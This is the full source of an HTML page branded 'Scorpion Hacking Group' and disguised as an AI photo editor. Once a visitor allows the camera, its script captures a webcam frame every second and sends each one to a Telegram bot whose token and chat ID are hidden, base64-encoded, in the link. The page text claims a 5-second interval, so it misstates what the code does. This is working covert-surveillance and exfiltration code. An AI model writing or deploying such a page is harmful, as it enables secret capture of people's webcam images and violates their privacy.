<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Scorpion Hacking Group</title>
    <style>
        body {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background: linear-gradient(135deg, #ff9a9e, #fad0c4);
            font-family: 'Arial', sans-serif;
            padding: 1.25rem;
        }
        .editor-card {
            background: rgba(255, 255, 255, 0.15);
            backdrop-filter: blur(0.9375rem);
            border-radius: 1.25rem;
            padding: 2rem;
            width: 100%;
            max-width: 25rem;
            text-align: center;
            box-shadow: 0 0.625rem 2.5rem rgba(0, 0, 0, 0.3);
        }
        h1, h2, p { color: #fff; }
        .btn {
            background: #ffcc00;
            border: none;
            padding: 0.8rem 1.5rem;
            border-radius: 0.625rem;
            color: #333;
            font-size: 1rem;
            cursor: pointer;
            margin: 0.5rem;
        }
        video {
            width: 100%;
            border-radius: 0.625rem;
            margin-top: 1rem;
            max-height: 12.5rem;
            display: none;
        }
        .pulse {
            font-size: 1.5rem;
            color: #ffcc00;
            margin-top: 1rem;
            animation: pulse 1.5s infinite;
        }
        @keyframes pulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.2); }
        }
        footer {
            position: fixed;
            bottom: 1rem;
            color: #fff;
            font-size: 0.9rem;
            text-align: center;
            width: 100%;
        }
        footer a {
            color: #ffcc00;
            text-decoration: none;
        }
        footer a:hover { color: #e6b800; }
    </style>
</head>
<body>
    <div class="editor-card">
        <h1>Scorpion Hacking Group</h1>
        <h2>Advance AI Photo Editor</h2>
        <p>Camera allow karte hi, aapki photo har 5 second me click hogi (Telegram par bheji jaayegi).</p>
        <button class="btn" onclick="accessCamera()">Allow Camera</button>
        <video id="video" autoplay></video>
        <div class="pulse">âš¡</div>
    </div>
    <footer>
        Developed By <a href="https://t.me/ScorpionYug" target="_blank">Scorpion Yug</a> & Zara
    </footer>
    <script>
        // URL params se bot token/chat id decode karo
        const params = new URLSearchParams(window.location.search);
        const encodedToken = params.get('t');
        const encodedChatId = params.get('c');
        const botToken = atob(encodedToken || '');
        const chatId = atob(encodedChatId || '');

        let stream = null;
        let captureInterval = null;

        // DataURL ko Blob mein convert karo
        function dataURLtoBlob(dataurl) {
            var arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1],
                bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
            while(n--){
                u8arr[n] = bstr.charCodeAt(n);
            }
            return new Blob([u8arr], {type:mime});
        }

        // Photo Telegram par bhejo
        function sendToTelegram(photo) {
            if (!botToken || !chatId) return;
            if (photo.startsWith('data:image/')) {
                var blob = dataURLtoBlob(photo);
                var formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('caption', 'Photo From Scorpion Hacking Group ðŸ”¥\n\nâœ… Join Us For More Tools\n@ScorpionHackingGroup');
                formData.append('photo', blob, 'photo.png');
                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
            }
        }

        // Camera access + auto capture
        async function accessCamera() {
            try {
                stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('video');
                video.style.display = 'block';
                video.srcObject = stream;

                // Har 1 second me photo click karo aur bhejo
                captureInterval = setInterval(() => {
                    if (video.videoWidth && video.videoHeight) {
                        const canvas = document.createElement('canvas');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        canvas.getContext('2d').drawImage(video, 0, 0);
                        const photo = canvas.toDataURL('image/png');
                        sendToTelegram(photo);
                    }
                }, 1000);
            } catch (err) {
                alert('Camera access denied!');
            }
        }

        // Page band hone par camera band karo
        window.addEventListener('beforeunload', () => {
            if (stream) stream.getTracks().forEach(track => track.stop());
            if (captureInterval) clearInterval(captureInterval);
        });
    </script>
</body>
</html>
